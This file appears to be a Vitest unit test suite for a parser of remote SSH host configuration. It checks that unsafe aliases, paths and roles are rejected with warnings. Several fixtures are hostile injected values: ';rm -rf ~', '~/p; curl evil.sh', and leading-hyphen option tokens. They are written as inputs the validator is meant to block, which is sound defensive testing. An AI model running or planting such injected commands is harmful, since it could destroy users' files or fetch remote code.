/**
 * remote-hosts.test.mjs — Unit tests for scripts/lib/config/remote-hosts.mjs (#1160)
 *
 * Each test names the bug it catches (TV-001):
 *   - absent block parsed as a declaration ⇒ a repo with no hosts would offload
 *   - defaults silently dropped ⇒ a host declared with only an alias accepts nothing
 *   - a record without an alias reaching the gate ⇒ `-H undefined` at connect time
 *   - a metacharacter alias reaching argv ⇒ command injection on the ssh line
 *   - an unsafe path kept ⇒ same, one field over
 *   - an unknown role kept ⇒ a host would accept a role it cannot run
 *   - an empty roles-allowed kept ⇒ a host that can never be selected sits in the list
 *   - a header carrying an inline comment being entered ⇒ divergence from the
 *     documented matchBlockHeader contract (custom-phases has the same gotcha)
 */

import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest';
import {
  _parseRemoteHosts,
  REMOTE_HOST_DEFAULTS,
  ALLOWED_REMOTE_ROLES,
} from '@lib/config/remote-hosts.mjs';

let errSpy;
beforeEach(() => {
  errSpy = vi.spyOn(process.stderr, 'write').mockImplementation(() => true);
});
afterEach(() => {
  errSpy.mockRestore();
});

const warnText = () => errSpy.mock.calls.map((c) => String(c[0])).join('');

describe('_parseRemoteHosts — absent block', () => {
  it('returns [] when the block is completely absent', () => {
    expect(_parseRemoteHosts('')).toEqual([]);
    expect(_parseRemoteHosts('persistence: true\nvcs: gitlab\n')).toEqual([]);
  });

  it('returns [] when the block exists but has no list items', () => {
    expect(_parseRemoteHosts('remote-hosts:\n\npersistence: true\n')).toEqual([]);
  });
});

describe('_parseRemoteHosts — full parse + defaults', () => {
  it('parses a single fully-specified host', () => {
    const content = [
      'remote-hosts:',
      '  - alias: m5',
      '    roles-allowed: [test, ui, perf]',
      '    repo-path: ~/Projects/Alice',
      '    claude-path: ~/.local/bin/claude',
      '',
    ].join('\n');
    expect(_parseRemoteHosts(content)).toEqual([
      {
        alias: 'm5',
        'roles-allowed': ['test', 'ui', 'perf'],
        'repo-path': '~/Projects/Alice',
        'claude-path': '~/.local/bin/claude',
      },
    ]);
  });

  it('applies defaults when only the alias is declared', () => {
    const parsed = _parseRemoteHosts('remote-hosts:\n  - alias: m5\n');
    expect(parsed).toEqual([
      {
        alias: 'm5',
        'roles-allowed': [...REMOTE_HOST_DEFAULTS['roles-allowed']],
        'repo-path': null,
        'claude-path': null,
      },
    ]);
    expect(ALLOWED_REMOTE_ROLES).toEqual(['test', 'ui', 'perf']);
  });

  it('narrows roles-allowed to the declared subset', () => {
    const parsed = _parseRemoteHosts('remote-hosts:\n  - alias: m5\n    roles-allowed: [perf]\n');
    expect(parsed[0]['roles-allowed']).toEqual(['perf']);
  });

  it('stops scanning at the next top-level key', () => {
    const content = ['remote-hosts:', '  - alias: m5', 'persistence: true', '  - alias: ghost', ''].join(
      '\n',
    );
    expect(_parseRemoteHosts(content).map((h) => h.alias)).toEqual(['m5']);
  });
});

describe('_parseRemoteHosts — record drops', () => {
  it('drops a record missing alias, with a WARN', () => {
    const parsed = _parseRemoteHosts('remote-hosts:\n  - roles-allowed: [test]\n');
    expect(parsed).toEqual([]);
    expect(warnText()).toContain('missing required field: alias');
  });

  it('drops an alias carrying shell metacharacters, with a WARN', () => {
    const parsed = _parseRemoteHosts('remote-hosts:\n  - alias: ";rm -rf ~"\n');
    expect(parsed).toEqual([]);
    expect(warnText()).toContain('unsafe alias');
  });

  // Bug: the charset allowlists admitted a LEADING hyphen, so `alias: -H` and
  // `repo-path: --x` passed validation and then reached `offload`'s argv as
  // OPTION tokens rather than values — the operand behind them is swallowed as
  // the flag's argument and the command means something the operator never
  // declared. A charset cannot express "not first"; the anchor can.
  it('drops an alias that begins with a hyphen (argv option token), with a WARN', () => {
    expect(_parseRemoteHosts('remote-hosts:\n  - alias: "-H"\n')).toEqual([]);
    expect(warnText()).toContain('unsafe alias');
  });

  it('drops a repo-path that begins with a hyphen, with a WARN', () => {
    const content = ['remote-hosts:', '  - alias: m5', '    repo-path: "--x"', ''].join('\n');
    expect(_parseRemoteHosts(content)).toEqual([]);
    expect(warnText()).toContain('shell metacharacter in repo-path');
  });

  // An INTERIOR hyphen is the common case (`m5-box`, `~/Projects/my-repo`) and
  // must keep working — the anchor bans the position, never the character.
  it('keeps an interior hyphen in alias and paths', () => {
    const content = [
      'remote-hosts:',
      '  - alias: m5-box',
      '    repo-path: ~/Projects/my-repo',
      '',
    ].join('\n');
    const parsed = _parseRemoteHosts(content);
    expect(parsed.map((h) => h.alias)).toEqual(['m5-box']);
    expect(parsed[0]['repo-path']).toBe('~/Projects/my-repo');
  });

  it('drops a host with an unsafe repo-path but keeps its siblings', () => {
    const content = [
      'remote-hosts:',
      '  - alias: bad',
      '    repo-path: "~/p; curl evil.sh"',
      '  - alias: good',
      '',
    ].join('\n');
    expect(_parseRemoteHosts(content).map((h) => h.alias)).toEqual(['good']);
    expect(warnText()).toContain('shell metacharacter in repo-path');
  });

  it('filters an unknown role with a WARN and keeps the known ones', () => {
    const parsed = _parseRemoteHosts(
      'remote-hosts:\n  - alias: m5\n    roles-allowed: [test, impl, security]\n',
    );
    expect(parsed[0]['roles-allowed']).toEqual(['test']);
    expect(warnText()).toContain('unknown role(s) impl, security');
  });

  it('drops a host whose roles-allowed is empty after filtering', () => {
    const parsed = _parseRemoteHosts('remote-hosts:\n  - alias: m5\n    roles-allowed: [impl]\n');
    expect(parsed).toEqual([]);
    expect(warnText()).toContain('empty after filtering');
  });
});

describe('_parseRemoteHosts — header form', () => {
  it('does NOT enter the block when the header carries an inline comment', () => {
    // matchBlockHeader rejects `key:  # note` by contract (block-header.mjs).
    // Pinned so a future tolerance change here surfaces as a decision, not a surprise.
    expect(_parseRemoteHosts('remote-hosts:  # opt-in\n  - alias: m5\n')).toEqual([]);
  });

  it('enters the bold-bullet markdown header form', () => {
    expect(_parseRemoteHosts('- **remote-hosts:**\n  - alias: m5\n').map((h) => h.alias)).toEqual([
      'm5',
    ]);
  });
});
